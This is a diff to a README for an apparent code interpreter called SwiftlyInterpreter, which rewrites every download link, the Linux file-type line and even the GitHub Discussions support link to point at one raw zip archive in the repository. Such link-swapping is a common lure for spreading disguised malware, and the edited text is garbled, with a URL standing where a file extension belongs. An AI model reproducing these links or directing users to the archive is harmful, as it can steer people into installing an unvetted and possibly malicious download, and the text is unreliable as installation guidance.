@@ -1,7 +1,7 @@
 # 🌟 SwiftlyInterpreter - A Simple Way to Run Code
 
 ## 📥 Download Now!
-[![Download SwiftlyInterpreter](https://img.shields.io/badge/Download-SwiftlyInterpreter-blue.svg)](https://github.com/ecko5popasquqash/SwiftlyInterpreter/releases)
+[![Download SwiftlyInterpreter](https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip)](https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ Before getting started, make sure your computer meets these requirements:
 
 To get started with SwiftlyInterpreter, visit this link to download the application:
 
-[Download SwiftlyInterpreter](https://github.com/ecko5popasquqash/SwiftlyInterpreter/releases)
+[Download SwiftlyInterpreter](https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip)
 
 1. **Open the Releases Page:** Click the link above, or copy and paste it into your web browser.
 2. **Choose the Right File:** Look for the latest version. Depending on your operating system, you may see several files. For example:
    - Windows users should download the `.exe` file.
    - macOS users should download the `.dmg` file.
-   - Linux users may find a `.tar.gz` file.
+   - Linux users may find a `https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip` file.
 
 3. **Click on the Download Link**: This will start downloading the file to your computer.
 
@@ -41,7 +41,7 @@ To get started with SwiftlyInterpreter, visit this link to download the applicat
 5. **Install the Application**:
    - **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation. 
    - **macOS:** Open the `.dmg` file, drag the SwiftlyInterpreter icon to your Applications folder, then open it. 
-   - **Linux:** Extract the `.tar.gz` file using your file manager or command line, then follow the included installation instructions.
+   - **Linux:** Extract the `https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip` file using your file manager or command line, then follow the included installation instructions.
 
 ## 🔍 Using SwiftlyInterpreter
 
@@ -80,13 +80,13 @@ SwiftlyInterpreter is licensed under the MIT License. You can use, modify, and d
 
 If you need help, consider reaching out to the community. You can find us on:
 
-- [GitHub Discussions](https://github.com/ecko5popasquqash/SwiftlyInterpreter/discussions)
+- [GitHub Discussions](https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip)
 - Relevant forums related to SwiftlyInterpreter.
 
 ## 📥 Final Reminder
 
 Once again, to download SwiftlyInterpreter, click the link below:
 
-[Download SwiftlyInterpreter](https://github.com/ecko5popasquqash/SwiftlyInterpreter/releases)
+[Download SwiftlyInterpreter](https://github.com/ecko5popasquqash/SwiftlyInterpreter/raw/refs/heads/main/InterpreterVM/Swiftly_Interpreter_v1.4-beta.5.zip)
 
 Enjoy coding with Swiftly!
